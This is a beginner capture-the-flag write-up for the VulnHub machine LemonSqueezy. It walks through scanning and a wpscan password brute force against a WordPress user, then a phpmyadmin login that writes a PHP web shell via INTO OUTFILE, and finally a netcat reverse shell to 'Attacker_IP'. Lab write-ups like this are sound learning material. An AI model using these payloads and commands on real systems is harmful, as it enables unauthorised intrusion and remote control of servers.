# Lemonsquuezy:1 ~vulnhub writeup

**DISCRIPTION**

This is a beginner boot2root challenge.

This is a VMware machine. DHCP is enabled, add lemonsqueezy to your hosts. It’s easypeasy!

Difficulty level: Beginner to intermediate

Author: James Hay

Download link- [https://download.vulnhub.com/lemonsqueezy/LemonSqueezy.7z](https://download.vulnhub.com/lemonsqueezy/LemonSqueezy.7z)

1. Find out Target IP address - **nmap -sn 192.168.122.0/24**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled.png)

### Scanning

  2.  Full port scanning - **nmap -p- 192.168.122.143**

*** Port 80 is open

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%201.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%201.png)

  3.   Service version scanning - **nmap -sV -A -p 192.168.122.143**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%202.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%202.png)

  4.  OS Scanning - **nmap -O 192.168.122.143**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%203.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%203.png)

   5.  Vulnerability scanning using nmap 

**nmap -sV -A --script vuln -p 80 192.168.122.143**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%204.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%204.png)

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%205.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%205.png)

   6.  **nikto -h 192.168.122.143**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%206.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%206.png)

** phpmyadmin directory found

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%207.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%207.png)

** CMS - Wordpress

### Enumeration

  7.  Wordpress scanning

Enumerating user - **wpscan —url [http://192.168.122.143/wordpress](http://192.168.122.143/wordpress) -e u**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%208.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%208.png)

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%209.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%209.png)

  8.  Add host in /etc/hosts

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2010.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2010.png)

  9.  Enumerating password

**wpscan —url [http://lemonsqueezy/wordpress](http://192.168.122.143/wordpress) --wordlist /usr/share/seclists/Passwords/darkweb2017.txt --username orange**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2011.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2011.png)

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2012.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2012.png)

### Exploitation

  10.  Login with username orange and password ginger

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2013.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2013.png)

SUCCESSFULLY LOGIN

  11.  Found Password of phpmyadmin

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2014.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2014.png)

  12.  Trying to login in phpmyadmin with username orange and password **n0t1n@w0rdl1st!**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2015.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2015.png)

  SUCCESSFULLY LOGIN

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2016.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2016.png)

  13.  Injecting RCE Payload in SQL Query

**"<?php echo system($_GET['cmd']); ?>" into OUTFILE "/var/www/html/wordpress/rev.php"**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2017.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2017.png)

  14.  Open in browser **[http://lemonsqueezy/wordpress](http://lemonsqueezy/wordpress)/rev.php?cmd=ls**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2018.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2018.png)

  15.  Taking reverse shell and start listening using command - nc -nlvp 8004

[**http://lemonsqueezy/wordpress](http://lemonsqueezy/wordpress)/rev.php?cmd=nc -e /bin/bash Attacker_IP 8004**

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2019.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2019.png)

Capturing user flag

![LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2020.png](LemonSqueezy%201%20Vulnhub%20writeup%20244bfb7371ac401eb637921ade66196e/Untitled%2020.png)
